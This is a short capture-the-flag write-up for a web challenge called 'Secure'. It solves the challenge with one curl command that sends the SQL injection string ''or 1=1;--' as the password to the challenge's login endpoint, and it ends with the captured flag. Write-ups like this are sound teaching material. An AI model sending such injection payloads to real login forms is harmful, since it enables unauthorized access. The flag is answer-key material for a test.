# Web / Secure
By BrownieInMotion

Just learned about encryption—now, my website is unhackable!

https://secure.mc.ax/

# Solution
The website looks like this. 

<img src="https://user-images.githubusercontent.com/86171033/125356385-ff7d7900-e31a-11eb-8e17-8b5c4e7915f5.png" alt="image" width="800"/>

One solution is to use curl:

```curl https://secure.mc.ax/login --data "username=admin&password='or 1=1;--"```

The output looks like this:

<img src="https://user-images.githubusercontent.com/86171033/125361948-ef699780-e322-11eb-97d2-0d8f6c757e6c.PNG" width="800"/>

# Flag
```flag{7B50m37h1n6_50m37h1n6_cl13n7_n07_600d}```
